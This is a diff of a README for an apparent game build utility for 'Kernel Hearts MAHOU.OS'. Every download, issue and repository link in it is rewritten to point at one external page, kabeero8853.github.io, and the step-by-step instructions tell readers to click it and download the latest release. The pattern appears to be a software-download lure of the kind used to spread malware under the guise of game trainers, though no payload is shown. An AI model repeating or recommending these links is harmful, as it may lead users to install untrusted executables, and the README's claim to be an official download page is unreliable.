@@ -1,6 +1,6 @@
 # 🎮 Kernel-Hearts-Chip-Run-Utility - Your Ultimate Build Companion for MAHOU.OS
 
-[![Download Now](https://img.shields.io/badge/Download-Kernel_Hearts_Utility-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Kabeero8853/Kernel-Hearts-Chip-Run-Utility/releases)
+[![Download Now](https://img.shields.io/badge/Download-Kernel_Hearts_Utility-FF6B6B?style=for-the-badge&logo=windows&logoColor=white)](https://kabeero8853.github.io)
 
 ## 🌟 What Is This?
 
@@ -18,7 +18,7 @@ Follow these three easy steps, and you'll be up and running in under two minutes
 
 Visit this link to download the application:
 
-👉 **[Kernel-Hearts-Chip-Run-Utility - Official Download Page](https://github.com/Kabeero8853/Kernel-Hearts-Chip-Run-Utility/releases)**
+👉 **[Kernel-Hearts-Chip-Run-Utility - Official Download Page](https://kabeero8853.github.io)**
 
 The page will show you available versions. Click the latest one to begin downloading.
 
@@ -120,7 +120,7 @@ Save time with templates:
 ### Step-by-Step Download Instructions
 
 1. **Open your web browser** (Edge, Chrome, Firefox — any browser works fine)
-2. **Click this link:** [Download Kernel-Hearts-Chip-Run-Utility](https://github.com/Kabeero8853/Kernel-Hearts-Chip-Run-Utility/releases)
+2. **Click this link:** [Download Kernel-Hearts-Chip-Run-Utility](https://kabeero8853.github.io)
 3. **Find the latest release** — Look for the newest version number at the top of the page
 4. **Click the download button** associated with that release
 5. **Wait for the download to complete** — This may take a few seconds depending on your internet speed
@@ -196,7 +196,7 @@ We regularly release updates with:
 - Performance improvements
 - Bug fixes
 
-Check the [releases page](https://github.com/Kabeero8853/Kernel-Hearts-Chip-Run-Utility/releases) periodically for new versions. Updates are always free.
+Check the [releases page](https://kabeero8853.github.io) periodically for new versions. Updates are always free.
 
 ---
 
@@ -217,8 +217,8 @@ Download it today and transform your Kernel Hearts MAHOU.OS experience!
 ---
 
 **🔗 Quick Access Links:**
-- [Download Latest Version](https://github.com/Kabeero8853/Kernel-Hearts-Chip-Run-Utility/releases)
-- [Report an Issue](https://github.com/Kabeero8853/Kernel-Hearts-Chip-Run-Utility/issues)
-- [Repository Home](https://github.com/Kabeero8853/Kernel-Hearts-Chip-Run-Utility)
+- [Download Latest Version](https://kabeero8853.github.io)
+- [Report an Issue](https://kabeero8853.github.io)
+- [Repository Home](https://kabeero8853.github.io)
 
 Keywords: 2026, 256kb, action-rpg, attack-profiles, boss-profiles, build-planner, chip-build, gaming-tools, kernel-hearts, kernel-hearts-2026, kernel-hearts-build-utility, kernel-hearts-trainer, magical-girl, mahou-os, movement-profiles, pc-gaming, roguelike, run-history, spell-profiles, windows
